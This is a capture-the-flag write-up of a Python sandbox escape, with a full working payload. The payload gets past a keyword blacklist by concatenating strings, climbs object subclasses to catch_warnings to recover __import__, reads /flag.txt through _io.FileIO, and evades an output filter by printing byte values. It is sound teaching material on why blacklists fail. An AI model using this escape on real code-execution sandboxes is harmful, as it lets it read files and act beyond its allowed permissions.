# python-tutor-pro

## Overview
Writeup for **python-tutor-pro** from Override CTF 2026.

## Category
Web / Misc (Python Jail Escape)

## Difficulty
Medium / Hard

## Description
The challenge featured a website called **python-tutor-pro**, which allowed users to execute Python code in a "restricted" environment. The platform utilized a custom sandbox with empty builtins, a keyword blacklist, and an output filter designed to block the flag string.

## Initial Analysis
The backend sandbox implemented several layers of protection:
1. **Builtin Stripping:** `__builtins__` was set to an empty dictionary in `exec()`.
2. **Keyword Blacklist:** Substrings like `import`, `os`, `open`, `__subclasses__`, and `__globals__` were blocked in the source code.
3. **Output Filtering:** Any output matching the flag (after stripping whitespace) was suppressed.

However, the sandbox allowed access to `getattr`, `type`, and `print`, which are sufficient for object introspection and escaping via Python's class hierarchy.

## Tools Used
- `Python 3` (Exploit development)
- `Requests` (Automating the payload submission)

## Approach
The goal was to reach the `object` base class, traverse its subclasses to find a dangerous module (like `warnings`), and recover the real `__builtins__` and `__import__` functions.

### 1. Bypassing the Blacklist
Since the blacklist checked the raw source code string, I used string concatenation within `getattr()` to bypass the checks:
- `getattr(obj, "__sub" + "classes__")` instead of `obj.__subclasses__`

### 2. Recovering Builtins
By traversing the subclasses of `object`, I located `catch_warnings`. This class provides access to its internal `_module`, which contains the full global scope of the `warnings` module, including the original `__builtins__`.

### 3. Evading the Output Filter
The server blocked the flag string from appearing in the output. To bypass this, I iterated through the flag bytes and printed their decimal values (e.g., `79 86 82 68 ...`). The filter only checked for the literal flag string, so numeric output passed through undetected.

## Steps to Solve
### 1. Reaching the Object Base
Using an empty tuple to climb the MRO (Method Resolution Order):
```python
o = ().__class__.__bases__[0] # <class 'object'>
```

### 2. Finding the `catch_warnings` Gadget
```python
S = "__sub" + "classes__"
subs = getattr(o, S)()
cw = [c for c in subs if c.__name__ == "catch_warnings"][0]
```

### 3. Importing File I/O
Once `__import__` was recovered from the `catch_warnings` module's builtins, I used the `_io` module to read the flag without using the blacklisted `open` word.
```python
m = cw()._module
B = getattr(m, "__bui" + "ltins__")
I = B["__imp" + "ort__"]
io = I("_io")
f = io.FileIO("/flag.txt")
```

### 4. Extracting the Flag
Instead of printing the flag directly, I printed the integer value of each character to bypass the output filter.

## Flag
`OVRD{pyth0n_j41l_br34k_suBcl4ss3s_g3t4ttr_m4st3r_dhh823mdhk}`

## What I Learned
- **Blacklist Fallacy:** Blacklists are almost always insufficient for securing Python environments due to dynamic attribute access via `getattr`.
- **Introspection Power:** Python's object model is extremely interconnected; if you can touch any class, you can likely reach the entire runtime.
- **Output Encoding:** Filters based on string matching can be easily bypassed by changing the representation of the data (hex, decimal, base64).

## References
_N/A_

## Additional Details
### 💻 Full Exploit Payload
```python
# Reconstruct restricted attributes via string concatenation
S = "__sub" + "classes__"
B_str = "__bui" + "ltins__"
I_str = "__imp" + "ort__"

# Traverse to object and find catch_warnings
o = ().__class__.__bases__[0]
subs = getattr(o, S)()
cw = [c for c in subs if c.__name__ == "catch_warnings"][0]

# Access the real builtins and import
m = cw()._module
B = getattr(m, B_str)
I = B[I_str]

# Use _io.FileIO to read /flag.txt without using 'open'
io = I("_io")
f = io.FileIO("/flag.txt")
data = f.read()

# Bypass output filter by printing character codes
for byte in data:
    print(byte)
```
